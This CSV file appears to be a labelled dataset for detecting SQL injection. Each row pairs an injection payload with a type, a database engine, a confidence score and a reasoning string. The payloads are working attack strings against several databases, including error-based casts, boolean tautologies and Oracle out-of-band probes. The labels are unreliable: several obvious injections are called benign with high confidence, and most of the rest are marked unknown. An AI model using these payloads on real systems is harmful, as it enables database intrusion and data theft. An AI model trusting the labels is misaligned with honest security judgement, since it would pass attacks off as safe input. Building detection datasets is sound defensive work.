id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
37677,"1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37678,"-3978 and username = ""1 ) ) ) and ( ( ( 4694 = 4694",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37679,"select * from users WHERE username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or username = ""-6036 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37680,"select * from users WHERE username = ""-9501\' ) and ( \'%\' = \'"" and username = ""-6665\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37681,-2181\' ) or# 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'wyez\' = \'wyez,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37682,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1%\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37683,-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37684,"SELECT * FROM users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" OR username = ""1\' ) where 2511 = 2511",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37685,"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" and username = ""-8112\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37686,"1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37687,"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) or username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37688,"1 and username = ""1\' ) and ( \'rjjo\' = \'rjjo"" or username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37689,1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37690,1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37691,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37692,"select * from users WHERE username = ""1 ) and ( 9932 = 9932"" or username = ""1 ) where 6039 = 6039",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37693,"-5013\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37694,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""-2495 ) ) as hudw where 4197 = 4197",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37695,-8069\' ) ) and ( ( \'qbvz\' = \'qbvz,benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37696,"-6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) or username = ""1\' ) or username = ""1\' ) ) and ( ( \'mmfq\' = \'mmfq",out_of_band,oracle,1.0,Token 'utl_inaddr' → out_of_band (priority 2); DB=oracle. Evidence in payload: -6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( ,3
37697,"select * from users WHERE username = ""1\' ) and ( 4703 = 4703"" or username = ""-6179 ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37698,"select * from users WHERE username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1254"" or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",error_based,oracle,1.0,"Token 'xmltype (' → error_based (priority 4); DB=oracle. Evidence in payload: select * from users WHERE username = ""1%\' ) ) ) and 3754 = ",3
37699,"1\'+ ( select onzd where 8452 = 8452 or username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37700,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 and username = ""-7874 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37701,-1641\' ) ) and ( ( \'vgcb\' like \'vgcb,benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37702,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" or username = ""1"" and ""xyjg"" = ""xyjg"" or# username = ""-2783%\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37703,1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37704,"select * from users WHERE username = ""1 or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" or username = ""1 ) ) as xoch where 8765 = 8765",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37705,"1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37706,"1\', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 8979,8979,case when ( 8979 = 8979 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37707,"select * from users WHERE username = ""-8828%\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\' and username = ""-3899\' ) where 8152 = 8152",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37708,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'kkgt\' = \'kkgt"" and username = ""1%\' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37709,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx"" and username = ""-7184 ) as fshx where 3408 = 3408",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37710,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37711,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-2374 ) and username = ""1 ) ) as iihk where 5414 = 5414",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37712,"select * from users WHERE username = ""-9688%\' ) ) and ( ( \'%\' = \'"" and username = ""-2495 ) ) as hudw where 4197 = 4197",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37713,"1\' ) where 2511 = 2511 AND username = ""-5667%\' ) ) and ( ( \'%\' = \'",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37714,"-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""1\' and \'foju\' = \'foju",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37715,"select * from users WHERE username = ""-2920\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-5013\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37716,"select * from users WHERE username = ""1\' where 2389 = 2389 or username = ""-2181\' ) or# 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37717,"select * from users where username = ""1 )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37718,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37719,"select * from users WHERE username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""-9553 ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37720,"select * from users WHERE username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-5585\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37721,"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37722,"select * from users WHERE username = ""1 ) and ( 9932 = 9932"" and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37723,"select * from users WHERE username = ""-5013\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh"" and username = ""-7746\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37724,"1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37725,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'stqx\' = \'stqx"" and username = ""1%\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37726,"select * from users WHERE username = ""-9847%\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'"" or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37727,1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37728,"-3978 and username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37729,"1 ) ) as xoch where 8765 = 8765 or username = ""1"" and \'%\' = \'",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37730,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1889%\' ) ) ) and username = ""-1641\' ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37731,-6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( \'lwlk\' like \'lwlk,out_of_band,oracle,1.0,Token 'utl_inaddr' → out_of_band (priority 2); DB=oracle. Evidence in payload: -6823\' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( ,3
37732,"1\' ) ) as wkys where 2478 = 2478 or username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37733,"select * from users WHERE username = ""-1889%\' ) ) ) and username = ""-1641\' ) ) or username = ""-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37734,"1\' ) where 1502 = 1502 and username = ""-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37735,"select * from users WHERE username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-6203\' ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37736,"1 where 5161 = 5161 AND username = ""1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37737,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\' ) where 1502 = 1502 or username = ""-7199\'",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37738,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37739,"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37740,"select * from users WHERE username = ""1\' and \'ixzr\' = \'ixzr"" or username = ""1 ) ) )",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37741,1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'esal\' = \'esal,unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
37742,"-9501\' ) and username = ""-6353%\' ) ) and ( ( \'%\' = \'",benign,generic,0.85,No attack signals detected. Payload appears to be benign SQL.,3
37743,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu",unknown,generic,0.5,UNCERTAIN: Insufficient information to classify. Payload too short or ambiguous.,0
